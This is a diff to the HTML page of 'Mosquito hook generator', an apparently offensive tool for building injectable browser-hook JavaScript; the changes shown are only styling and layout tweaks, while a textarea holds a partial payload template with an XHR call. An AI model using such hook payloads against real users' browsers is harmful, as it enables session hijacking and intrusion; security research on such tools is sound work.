@@ -1,8 +1,14 @@
 <head>
 <title>Mosquito hook generator</title>
+<style>
+        body {font-size: 10px; font-family: verdana,sans-serif;}
+         .current { background-color: #ccc; }
+         h2 { border: 2px solid #ccc; padding: 0.5em; margin: 1em 0;}
+</style>
 <body>
 <h1>Mosquito hook generator</h1>
 <p><a href="https://github.com/koto/mosquito">Mosquito</a> by <a href="http://blog.kotowicz.net">Krzysztof Kotowicz</a>
+<p>
 <textarea id=payload type="text/payload" style="height:500px;width:90%" >
 if (!window.xxxx) {
 
@@ -26,8 +32,8 @@ x.send(null);
 window.xxxx = true;
 };
 </textarea>
-<br />
-<button onclick=generate() >Generate hook</button>
+<p>
+<button onclick=generate() ><strong>Generate hook</strong></button>
 <p>
 <code id="result" style="word-break:break-all;height:500px;width:90%;overflow:scroll;">&nbsp;</code>
 </p>
